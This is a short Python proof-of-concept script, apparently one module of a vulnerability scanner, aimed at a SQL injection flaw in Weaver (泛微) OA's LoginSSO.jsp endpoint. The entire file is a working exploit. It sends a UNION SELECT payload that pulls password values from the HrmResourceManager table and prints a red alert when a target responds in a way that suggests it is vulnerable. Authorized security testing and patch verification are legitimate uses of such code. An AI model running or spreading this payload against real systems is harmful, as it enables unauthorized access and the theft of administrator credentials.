import httpx
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url = target + '/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager'
        req = httpx.get(url,headers=headers)
        if "<code>" in req.text and "<BODY>" in req.text and req.status_code == 200:
            print("\033[0;31m 泛微OA LoginSSO.jsp SQL注入漏洞："+ url )
    except:
        pass


